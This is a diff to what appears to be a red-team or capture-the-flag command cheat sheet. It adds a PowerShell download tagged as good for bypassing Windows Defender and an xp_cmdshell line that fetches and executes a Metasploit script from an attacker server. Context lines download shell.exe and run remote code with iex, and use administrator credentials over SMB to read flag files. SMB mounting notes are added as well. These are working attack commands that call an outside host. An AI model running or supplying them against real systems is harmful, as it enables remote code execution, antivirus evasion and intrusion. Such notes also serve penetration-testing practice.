@@ -248,12 +248,11 @@ del_logs.bat               BUILTIN\Administrators     Everyone Allow  ReadAn...
 
 
 
-#Power shell download file
+#Power shell download file (Good for Windows Defender bypass)
 #Where x.x.x.x is the RedTeam (Attacker) running a python server
 powershell "(new-object System.Net.WebClient).Downloadfile('http://x.x.x.x:80/shell.exe', 'shell.exe')
-
+exec xp_cmdshell 'powershell "IEX (New-Object Net.WebClient).DownloadString(''http://x.x.x.x/msf2.ps1'');"'
 C:\BlueTeam>powershell "iex(new-object net.webclient).downloadstring('http://x.x.x.x/exploit.html')"
-
 
 
 #Scan smb 
@@ -279,6 +278,25 @@ Unable to connect with SMB1 -- no workgroup available
 smbclient -k -U username \\\\hostname.domain.local\\C$
 
 smb: \> more \USERS\username\Desktop\root.txt
+
+
+
+#Linux Mount SMB share
+mount -t cifs //x.x.x.x/Folder /mnt/tmp -o,user=username,password=password,vers=2.0
+ls /mnt/tmp
+Customers  Invoices  Payroll  Tax           zz_Archived
+Fees       Jess      Reports  Transactions  zz_Migration
+
+
+
+#SMB browsing using file manager
+#All require gvfs-smb other then Dolphin
+#Might have to create a smb password for user (smbpasswd -a username)
+Nemo (Cinnamon)
+Nautilus (Gnome)
+Caja (MATE)
+Thunar (XFCE)
+Dolphin (KDE/Plasma)
 
 
 
@@ -438,3 +456,5 @@ cmd /c 'application.exe'
 #Authenticate over the share
 net use I: \\x.x.x.x\C$ /user:administrator "1234test"
 type I:\Users\Administrator\Desktop\root.txt
+
+
